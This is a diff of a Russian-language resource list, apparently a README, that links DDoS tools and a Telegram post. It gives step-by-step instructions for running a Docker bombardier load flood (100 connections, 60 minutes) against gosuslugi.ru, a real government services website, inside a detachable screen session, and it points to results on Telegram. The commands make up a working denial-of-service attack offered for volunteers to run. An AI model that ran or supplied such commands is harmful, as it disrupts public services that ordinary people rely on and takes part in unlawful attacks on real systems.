@@ -65,10 +65,12 @@
 * Клавиатурные войска https://www.facebook.com/yaroslav.azhnyuk/posts/10159973106953151
 * DDoS (browser) https://ddos.featurelab.software/
 * DDoS (docker) https://github.com/ArturVasyliev/DDoS-Attack-Russian-Sites
-    * screen
-    * docker run -ti --rm alpine/bombardier -c 100 -d 60m -l https://www.gosuslugi.ru
-    * ctrl + A, ctrl + D
-    * screen -R
+  * еще https://t.me/c/1117020066/93020
+```
+screen
+docker run -ti --rm alpine/bombardier -c 100 -d 60m -l https://www.gosuslugi.ru
+ctrl + A, ctrl + D
+```
 
 Результат тут: https://t.me/virus_stories/525
 
